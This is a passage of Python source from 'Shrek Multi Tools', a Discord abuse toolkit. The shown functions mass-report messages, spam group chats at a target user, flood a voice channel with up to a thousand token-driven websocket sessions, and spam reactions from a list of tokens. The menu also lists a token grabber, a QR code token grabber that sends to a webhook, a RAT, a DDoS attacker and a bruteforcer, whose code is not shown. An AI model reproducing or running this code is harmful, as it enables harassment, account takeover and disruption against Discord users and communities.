        f' {Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}Message ID:{Fore.WHITE} '))
    reason1 = str(input(f"""
        '{Fore.GREEN}[{Fore.WHITE}1{Fore.GREEN}] {Fore.WHITE}Illegal content'
        '{Fore.GREEN}[{Fore.WHITE}2{Fore.GREEN}] {Fore.WHITE}Harassment'
        '{Fore.GREEN}[{Fore.WHITE}3{Fore.GREEN}] {Fore.WHITE}Spam or phishing link'
        '{Fore.GREEN}[{Fore.WHITE}4{Fore.GREEN}] {Fore.WHITE}Self-harm'
        '{Fore.GREEN}[{Fore.WHITE}5{Fore.GREEN}] {Fore.WHITE}NSFW content'
        ' {Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}Reason: """))
    if reason1.upper() in ('1', 'Illegal content'):
        reason1 = 0
    elif reason1.upper() in ('2', 'Harassment'):
        reason1 = 1
    elif reason1.upper() in ('3', 'Spam or phishing link'):
        reason1 = 2
    elif reason1.upper() in ('4', 'Self-harm'):
        reason1 = 3
    elif reason1.upper() in ('5', 'NSFW content'):
        reason1 = 4
    else:
        print(f"\nInvalid reason")
        sleep(1)
        main()
    utilities.Plugins.massreport.MassReport(token, guild_id1, channel_id1, message_id1, reason1)

  def qrcode():
    ctypes.windll.kernel32.SetConsoleTitleW("Shrek Multi Tools | Qr Grabber")
    cls()
    print(f"""
{Fore.GREEN}
  █████   ██▀███         ▄████  ██▀███   ▄▄▄       ▄▄▄▄     ▄▄▄▄   ▓█████ ██▀███  
▒██▓  ██ ▓██ ▒ ██▒    ▒ ██▒ ▀█▒▓██ ▒ ██▒▒████▄    ▓█████▄  ▓█████▄ ▓█   ▀▓██ ▒ ██▒
▒██▒  ██░▓██ ░▄█ ▒    ░▒██░▄▄▄░▓██ ░▄█ ▒▒██  ▀█▄  ▒██▒ ▄██ ▒██▒ ▄██▒███  ▓██ ░▄█ ▒
░██  █▀ ░▒██▀▀█▄      ░░▓█  ██▓▒██▀▀█▄  ░██▄▄▄▄██ ▒██░█▀   ▒██░█▀  ▒▓█  ▄▒██▀▀█▄  
░▒███▒█▄ ░██▓ ▒██▒    ░▒▓███▀▒░░██▓ ▒██▒ ▓█   ▓██▒░▓█  ▀█▓▒░▓█  ▀█▓░▒████░██▓ ▒██▒
░░ ▒▒░ ▒ ░ ▒▓ ░▒▓░     ░▒   ▒  ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░▒▓███▀▒░░▒▓███▀▒░░ ▒░ ░ ▒▓ ░▒▓░
 ░ ▒░  ░   ░▒ ░ ▒░      ░   ░    ░▒ ░ ▒░  ░   ▒▒ ░▒░▒   ░ ░▒░▒   ░  ░ ░    ░▒ ░ ▒░
   ░   ░    ░   ░     ░ ░   ░ ░   ░   ░   ░   ▒    ░    ░   ░    ░    ░     ░   ░ 
    ░       ░               ░     ░           ░  ░ ░      ░ ░         ░     ░     

    """)
    WebHook = input(f'{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}Webhook URL: ')
    validateWebhook(WebHook)
    utilities.Plugins.QR_grabber.QR_grabber(WebHook)   

  def groupchatspammer():
    ctypes.windll.kernel32.SetConsoleTitleW("Shrek Multi Tools | Group Spammer")
    cls()
    print(f"""
{Fore.GREEN}
 ▄████  ██▀███   ▒█████   █    ██  ██▓███        ██████  ██▓███   ▄▄▄      ███▄ ▄███▓ ███▄ ▄███▓ ▓█████ ██▀███  
 ██▒ ▀█▓██ ▒ ██▒▒██▒  ██▒ ██  ▓██▒▓██░  ██     ▒██    ▒ ▓██░  ██ ▒████▄   ▓██▒▀█▀ ██▒▓██▒▀█▀ ██▒ ▓█   ▀▓██ ▒ ██▒
▒██░▄▄▄▓██ ░▄█ ▒▒██░  ██▒▓██  ▒██░▓██░ ██▓▒    ░ ▓██▄   ▓██░ ██▓▒▒██  ▀█▄ ▓██    ▓██░▓██    ▓██░ ▒███  ▓██ ░▄█ ▒
░▓█  ██▒██▀▀█▄  ▒██   ██░▓▓█  ░██░▒██▄█▓▒ ▒      ▒   ██▒▒██▄█▓▒ ▒░██▄▄▄▄██▒██    ▒██ ▒██    ▒██  ▒▓█  ▄▒██▀▀█▄  
▒▓███▀▒░██▓ ▒██▒░ ████▓▒░▒▒█████▓ ▒██▒ ░  ░    ▒██████▒▒▒██▒ ░  ░▒▓█   ▓██▒██▒   ░██▒▒██▒   ░██▒▒░▒████░██▓ ▒██▒
░▒   ▒ ░ ▒▓ ░▒▓░░ ▒░▒░▒░ ░▒▓▒ ▒ ▒ ▒▓▒░ ░  ░    ▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░░▒▒   ▓▒█░ ▒░   ░  ░░ ▒░   ░  ░░░░ ▒░ ░ ▒▓ ░▒▓░
 ░   ░   ░▒ ░ ▒   ░ ▒ ▒░ ░░▒░ ░ ░ ░▒ ░         ░ ░▒  ░ ░░▒ ░     ░ ░   ▒▒ ░  ░      ░░  ░      ░░ ░ ░    ░▒ ░ ▒ 
 ░   ░   ░░   ░ ░ ░ ░ ▒   ░░░ ░ ░ ░░           ░  ░  ░  ░░         ░   ▒  ░      ░   ░      ░       ░    ░░   ░ 
     ░    ░         ░ ░     ░                        ░                 ░         ░          ░   ░   ░     ░     

        """)
    token = input(f"""{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}Token: """)
    UserID = input(f"""{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}User ID: """)
    group = input(f"""{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}Group Names: """)
    manygr = int(input(f"""{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}How Many Groups: """))
    headers = mainHeader(token)
    for i in range(manygr):
        try:
            r = requests.post('https://discord.com/api/v9/users/@me/channels', headers=headers,
                              json={"recipients": []})
            jsr = json.loads(r.content)
            groupID = jsr['id']
            time.sleep(0.5)
            r1 = requests.patch(f'https://discord.com/api/v9/channels/{groupID}', headers=headers,
                                json={'name': group})
            if r1.status_code == 200:
                print(f'{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}Group created')
            with open("data/groups.txt", "w") as groupID:
                groupID.write(jsr['id'] + '\n')
        except:
            print(f'{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}RateLimited for {jsr["retry_after"]} seconds'), time.sleep(jsr['retry_after'])
        scrIds = random.choice(open('data/groups.txt').readlines())
        grID = scrIds.strip('\n')
        r2 = requests.put(f'https://discord.com/api/v9/channels/{grID}/recipients/{UserID}',
                          headers={'Authorization': token})
        if r2.status_code == 204:
            print(f'{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}Group Members: {UserID}')
    time.sleep(1)
    exit = input(f'''
Press ENTER to continue... ''')
    exit = clear()
    exit = tool()

  global option2
  def option2():
    cls()
    ctypes.windll.kernel32.SetConsoleTitleW("Shrek Multi Tools | Made by Shrek™")
    print(f'''                                                                                                             Tokens: {Fore.LIGHTGREEN_EX}[{Fore.WHITE}{counttokens}{Fore.LIGHTGREEN_EX}]
{Fore.LIGHTGREEN_EX}                                           ██████   ██░ ██  ██▀███  ▓█████ ▀██ ▄█▀ 
{Fore.LIGHTGREEN_EX}                                         ▒██    ▒ ▒▓██░ ██ ▓██ ▒ ██▒▓█   ▀  ██▄█▒ 
{Fore.LIGHTGREEN_EX}                                         ░ ▓██▄   ░▒██▀▀██ ▓██ ░▄█ ▒▒███   ▓███▄░ 
{Fore.LIGHTGREEN_EX}                                           ▒   ██▒ ░▓█ ░██ ▒██▀▀█▄  ▒▓█  ▄ ▓██ █▄ 
{Fore.LIGHTGREEN_EX}                                         ▒██████▒▒ ░▓█▒░██▓░██▓ ▒██▒░▒████ ▒██▒ █▄
{Fore.LIGHTGREEN_EX}                                         ▒ ▒▓▒ ▒ ░  ▒ ░░▒░▒░ ▒▓ ░▒▓░░░ ▒░  ▒ ▒▒ ▓▒
{Fore.LIGHTGREEN_EX}                                         ░ ░▒  ░    ▒ ░▒░ ░  ░▒ ░ ▒░ ░ ░   ░ ░▒ ▒░     
{Fore.LIGHTGREEN_EX}                                         ░  ░  ░    ░  ░░ ░   ░   ░    ░   ░ ░░ ░                      
{Fore.LIGHTGREEN_EX}                                               ░    ░  ░  ░   ░        ░   ░  ░   
    ''')                           

    print(Fore.GREEN + '                 ')
    print(Fore.GREEN +f'                 ╔══════════════════════════════╦══════════════════════════╦══════════════════════════════╗')
    print(Fore.GREEN + '                 ║                              ║                          ║                              ║')
    print(Fore.GREEN +f'                 ║     [{Fore.WHITE}28{Fore.GREEN}] {Fore.WHITE}VC SPAMMER{Fore.GREEN}          ║     {Fore.GREEN}({Fore.WHITE}N{Fore.GREEN}/{Fore.WHITE}A{Fore.GREEN})                ║     {Fore.GREEN}({Fore.WHITE}N{Fore.GREEN}/{Fore.WHITE}A{Fore.GREEN})                    ║')
    print(Fore.GREEN +f'                 ║     [{Fore.WHITE}29{Fore.GREEN}] {Fore.WHITE}SERVER LOOKUP{Fore.GREEN}       ║     {Fore.GREEN}({Fore.WHITE}N{Fore.GREEN}/{Fore.WHITE}A{Fore.GREEN})                ║     {Fore.GREEN}({Fore.WHITE}N{Fore.GREEN}/{Fore.WHITE}A{Fore.GREEN})                    ║')
    print(Fore.GREEN +f'                 ║     [{Fore.WHITE}30{Fore.GREEN}] {Fore.WHITE}REACTION SPAMMER{Fore.GREEN}    ║     {Fore.GREEN}({Fore.WHITE}N{Fore.GREEN}/{Fore.WHITE}A{Fore.GREEN})                ║     {Fore.GREEN}({Fore.WHITE}N{Fore.GREEN}/{Fore.WHITE}A{Fore.GREEN})                    ║')
    print(Fore.GREEN +f'                 ║     ({Fore.WHITE}N{Fore.GREEN}/{Fore.WHITE}A{Fore.GREEN})                    ║     {Fore.GREEN}({Fore.WHITE}N{Fore.GREEN}/{Fore.WHITE}A{Fore.GREEN})                ║     {Fore.GREEN}({Fore.WHITE}N{Fore.GREEN}/{Fore.WHITE}A{Fore.GREEN})                    ║')
    print(Fore.GREEN +f'                 ║     ({Fore.WHITE}N{Fore.GREEN}/{Fore.WHITE}A{Fore.GREEN})                    ║     {Fore.GREEN}({Fore.WHITE}N{Fore.GREEN}/{Fore.WHITE}A{Fore.GREEN})                ║     {Fore.GREEN}({Fore.WHITE}N{Fore.GREEN}/{Fore.WHITE}A{Fore.GREEN})                    ║')
    print(Fore.GREEN +f'                 ║     ({Fore.WHITE}N{Fore.GREEN}/{Fore.WHITE}A{Fore.GREEN})                    ║     {Fore.GREEN}({Fore.WHITE}N{Fore.GREEN}/{Fore.WHITE}A{Fore.GREEN})                ║     {Fore.GREEN}({Fore.WHITE}N{Fore.GREEN}/{Fore.WHITE}A{Fore.GREEN})                    ║')
    print(Fore.GREEN +f'                 ║     ({Fore.WHITE}N{Fore.GREEN}/{Fore.WHITE}A{Fore.GREEN})                    ║     {Fore.GREEN}({Fore.WHITE}N{Fore.GREEN}/{Fore.WHITE}A{Fore.GREEN})                ║     {Fore.GREEN}({Fore.WHITE}N{Fore.GREEN}/{Fore.WHITE}A{Fore.GREEN})                    ║')
    print(Fore.GREEN +f'                 ║     ({Fore.WHITE}N{Fore.GREEN}/{Fore.WHITE}A{Fore.GREEN})                    ║     {Fore.GREEN}({Fore.WHITE}N{Fore.GREEN}/{Fore.WHITE}A{Fore.GREEN})                ║     {Fore.GREEN}({Fore.WHITE}N{Fore.GREEN}/{Fore.WHITE}A{Fore.GREEN})                    ║')
    print(Fore.GREEN +f'                 ║     ({Fore.WHITE}N{Fore.GREEN}/{Fore.WHITE}A{Fore.GREEN})                    ║     {Fore.GREEN}({Fore.WHITE}N{Fore.GREEN}/{Fore.WHITE}A{Fore.GREEN})                ║     {Fore.GREEN}({Fore.WHITE}N{Fore.GREEN}/{Fore.WHITE}A{Fore.GREEN})                    ║')
    print(Fore.GREEN + '                 ║                              ║                          ║                              ║')
    print(Fore.GREEN + '                 ╚══════════════════════════════╩══════════════════════════╩══════════════════════════════╝')
    print(Fore.GREEN +f'                                                                                          {Fore.GREEN}[{Fore.WHITE}P{Fore.GREEN}] {Fore.WHITE}PREVIOUS PAGE ')
    print(Fore.GREEN + '')
    print(f'  {Fore.WHITE}┌──<{user_name}{Fore.GREEN}@{Fore.WHITE}Shrek>─{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}]')
    global options
    option2 = input(f'  {Fore.WHITE}└───{Fore.GREEN}➤{Fore.WHITE} ')


    if option2 in ['28']:
      ctypes.windll.kernel32.SetConsoleTitleW("Shrek Multi Tools | VoiceChat Spammer")
      cls()
      print(f"""
  {Fore.GREEN}
   ▄████  ██▀███   ▒█████   █    ██  ██▓███        ██████  ██▓███   ▄▄▄      ███▄ ▄███▓ ███▄ ▄███▓ ▓█████ ██▀███  
   ██▒ ▀█▓██ ▒ ██▒▒██▒  ██▒ ██  ▓██▒▓██░  ██     ▒██    ▒ ▓██░  ██ ▒████▄   ▓██▒▀█▀ ██▒▓██▒▀█▀ ██▒ ▓█   ▀▓██ ▒ ██▒
  ▒██░▄▄▄▓██ ░▄█ ▒▒██░  ██▒▓██  ▒██░▓██░ ██▓▒    ░ ▓██▄   ▓██░ ██▓▒▒██  ▀█▄ ▓██    ▓██░▓██    ▓██░ ▒███  ▓██ ░▄█ ▒
  ░▓█  ██▒██▀▀█▄  ▒██   ██░▓▓█  ░██░▒██▄█▓▒ ▒      ▒   ██▒▒██▄█▓▒ ▒░██▄▄▄▄██▒██    ▒██ ▒██    ▒██  ▒▓█  ▄▒██▀▀█▄  
  ▒▓███▀▒░██▓ ▒██▒░ ████▓▒░▒▒█████▓ ▒██▒ ░  ░    ▒██████▒▒▒██▒ ░  ░▒▓█   ▓██▒██▒   ░██▒▒██▒   ░██▒▒░▒████░██▓ ▒██▒
  ░▒   ▒ ░ ▒▓ ░▒▓░░ ▒░▒░▒░ ░▒▓▒ ▒ ▒ ▒▓▒░ ░  ░    ▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░░▒▒   ▓▒█░ ▒░   ░  ░░ ▒░   ░  ░░░░ ▒░ ░ ▒▓ ░▒▓░
   ░   ░   ░▒ ░ ▒   ░ ▒ ▒░ ░░▒░ ░ ░ ░▒ ░         ░ ░▒  ░ ░░▒ ░     ░ ░   ▒▒ ░  ░      ░░  ░      ░░ ░ ░    ░▒ ░ ▒ 
   ░   ░   ░░   ░ ░ ░ ░ ▒   ░░░ ░ ░ ░░           ░  ░  ░  ░░         ░   ▒  ░      ░   ░      ░       ░    ░░   ░ 
       ░    ░         ░ ░     ░                        ░                 ░         ░          ░   ░   ░     ░     
  
          """)    
      tokenlist = open("tokens.txt", "r").read().splitlines()
      channel = input(f"""{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}]{Fore.WHITE} Voice Channel ID: """)
      server = input(f"""{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}]{Fore.WHITE} Server ID: """)
      deaf = input(f"""{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}Defean: (y/n) """)
      if deaf == "y":
        deaf = True
        if deaf == "n":
          deaf = False
      mute = input(f"""{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}Mute: (y/n) """)
      if mute == "y":
        mute = True
        if mute == "n":
          mute = False
      stream = input(f"""{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}Stream: (y/n) """)
      if stream == "y":
        stream = True
        if stream == "n":
          stream = False
      video = input(f"""{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}Video: (y/n) """)
      if video == "y":
        video = True
        if video == "n":
          video = False
  
      executor = ThreadPoolExecutor(max_workers=int(1000))
      def run(token):
        while True:
          ws = WebSocket()
          ws.connect("wss://gateway.discord.gg/?v=8&encoding=json")
          hello = loads(ws.recv())
          heartbeat_interval = hello['d']['heartbeat_interval']
          ws.send(dumps({"op": 2,"d": {"token": token,"properties": {"$os": "windows","$browser": "Discord","$device": "desktop"}}}))
          ws.send(dumps({"op": 4,"d": {"guild_id": server,"channel_id": channel,"self_mute": mute,"self_deaf": deaf, "self_stream?": stream, "self_video": video}}))
          ws.send(dumps({"op": 18,"d": {"type": "guild","guild_id": server,"channel_id": channel,"preferred_region": "singapore"}}))
          ws.send(dumps({"op": 1,"d": None}))
          sleep(0.1)
  
      i = 0
  
      for token in tokenlist:
        executor.submit(run, token)
        i+=1
        print(f"""{Fore.YELLOW}[{Fore.WHITE}-{Fore.YELLOW}] {Fore.WHITE}Joined VC""")
        sleep(0.01)
      yay = input(f"""{Fore.MAGENTA}[{Fore.WHITE}!{Fore.MAGENTA}] {Fore.WHITE}Press ENTER to Stop VC Spammer!""")

    elif option2 in ['29']:
      ctypes.windll.kernel32.SetConsoleTitleW("Shrek Multi Tools | Server Lookup")
      subprocess.call(["python", "utilities/Plugins/Server_Lookup.py"])

    elif option2 in ['30']:
      ctypes.windll.kernel32.SetConsoleTitleW("Shrek Multi Tools | Reaction Spammer")
      cls()
      print(f"""
  {Fore.GREEN}
   ██▀███   ▓█████ ▄▄▄       ▄████▄ ▄▄▄█████▓  ██▓ ▒█████   ███▄    █     
  ▓██ ▒ ██▒ ▓█   ▀▒████▄    ▒██▀ ▀█ ▓  ██▒ ▓▒▒▓██▒▒██▒  ██▒ ██ ▀█   █     
  ▓██ ░▄█ ▒ ▒███  ▒██  ▀█▄  ▒▓█    ▄▒ ▓██░ ▒░▒▒██▒▒██░  ██▒▓██  ▀█ ██▒    
  ▒██▀▀█▄   ▒▓█  ▄░██▄▄▄▄██▒▒▓▓▄ ▄██░ ▓██▓ ░ ░░██░▒██   ██░▓██▒  ▐▌██▒    
  ░██▓ ▒██▒▒░▒████▒▓█   ▓██░▒ ▓███▀   ▒██▒ ░ ░░██░░ ████▓▒░▒██░   ▓██░    
  ░ ▒▓ ░▒▓░░░░ ▒░ ░▒▒   ▓▒█░░ ░▒ ▒    ▒ ░░    ░▓  ░ ▒░▒░▒░ ░ ▒░   ▒ ▒     
    ░▒ ░ ▒ ░ ░ ░  ░ ░   ▒▒    ░  ▒      ░    ░ ▒ ░  ░ ▒ ▒░ ░ ░░   ░ ▒░    
    ░░   ░     ░    ░   ▒   ░         ░      ░ ▒ ░░ ░ ░ ▒     ░   ░ ░     
     ░     ░   ░        ░   ░ ░                ░      ░ ░           ░     

  """)
      def reaction(chd, iddd, org, token):
          headers = {'Content-Type': 'application/json',
                     'Accept': '*/*',
                     'Accept-Encoding': 'gzip, deflate, br',
                     'Accept-Language': 'en-US',
                     'Cookie': f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                     'DNT': '1',
                     'origin': 'https://discord.com',
                     "sec-fetch-dest": "empty",
                     "sec-fetch-mode": "cors",
                     "sec-fetch-site": "same-origin",
                     'TE': 'Trailers',
                     'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAxIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDIiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6ODMwNDAsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9',
                     'authorization': token,
                     'user-agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0'
                     }
      
          emoji = ej.emojize(org, use_aliases=True)
          a = requests.put(
              f"https://discordapp.com/api/v9/channels/{chd}/messages/{iddd}/reactions/{emoji}/@me",
              headers=headers)
          if a.status_code == 204:
              print(f"{Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}] {Fore.WHITE}Reaction {org}")
          else:
              print(f"{Fore.MAGENTA}[{Fore.WHITE}!{Fore.MAGENTA}] {Fore.WHITE}Error")
      
      tokens = open('tokens.txt', 'r').read().splitlines()
      chd = input(f"""{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}Channel ID: """)
      iddd = input(f"""{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}Message ID: """)
      emoji = input(f"""{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}Emoji: """)
      delay = int(input(f"""{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}Delay: """))
      for token in tokens:
          time.sleep(delay)
          threading.Thread(target=reaction, args=(chd, iddd, emoji, token)).start()
      
      time.sleep(1)
      exit = input(f'press any key to continue...')
      exit = clear()
      exit = spammer()

    elif option2 in ['P','p']:
      tool()
      return
    
    else:
      print("Error, Invalid Option")


    while __name__ == '__main__' and option2 not in ['P','p']:
      print(Fore.WHITE)
      os.system('pause')
      tool()


  if options in ['1','01']:
    tokennuker()
  elif options in ['2','02']:
    webhooks()
  elif options in ['3','03']:
    leaver()
  elif options in ['4','04']:
    onliner()
  elif options in ['5','05']:
    joiner()
  elif options in ['6','06']:
    nuker()
  elif options in ['07','7']:
    tokenspammer()
  elif options in ['08','8']:
    friends()
  elif options in ['09','9']:
    groupchatspammer()
  elif options in ['10']:
    tokengen()
  elif options in ['11']:
    nitro()
  elif options in ['12']:
    proxyscrape()
  elif options in ['13']:
    grabber()
  elif options in ['14']:
    qrcode()    
  elif options in ['15']:
    discordrat()
  elif options in ['16']:
    scraper()
  elif options in ['17']:
    namegen()
  elif options in ['18']:
    subprocess.call(["python", "utilities/Plugins/DdosAttacker.py"])
  elif options in ['19']:
    bruteforce()
  elif options in ['20']:
    checker()
  elif options in ['21']:
    login()
  elif options in ['22']:
    subprocess.call(["python", "utilities/Plugins/tokeninfo.py"])
  elif options in ['23']:
    pfpmanager()
  elif options in ['24']:
    hypesquad()
  elif options in ['25']:
    biochanger()
  elif options in ['26']:
    idtotoken()
  elif options in ['27']:
    massreport()
  elif options in ['00','0']:
    exit()
  elif options in ['TM','tm']:
    discordserver()
  elif options in ['!']:
    settings()
  elif options in ['UPD','upd']:
    search_for_updates()
  elif options in ['N','n']:
    option2()
  else:
    print("Error, Invalid Option")



tool()
while __name__ == '__main__':
    print(Fore.WHITE)
    os.system('pause')
    tool()

